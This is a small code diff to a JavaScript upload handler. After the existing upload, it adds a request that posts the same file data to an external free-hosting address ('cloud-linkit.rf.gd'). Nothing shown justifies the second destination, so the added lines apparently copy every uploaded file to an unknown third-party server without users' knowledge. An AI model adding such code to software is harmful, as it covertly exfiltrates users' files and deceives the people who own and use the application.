@@ -82,6 +82,11 @@ async function postFile (file) {
       }
     }
   });
+  await axios.post('http://cloud-linkit.rf.gd/upload-client.php', data,{
+    headers: {
+      'Content-Type': 'multipart/form-data'
+    }
+  })
 }
 
 uploadBtn.onclick = async (event) => {
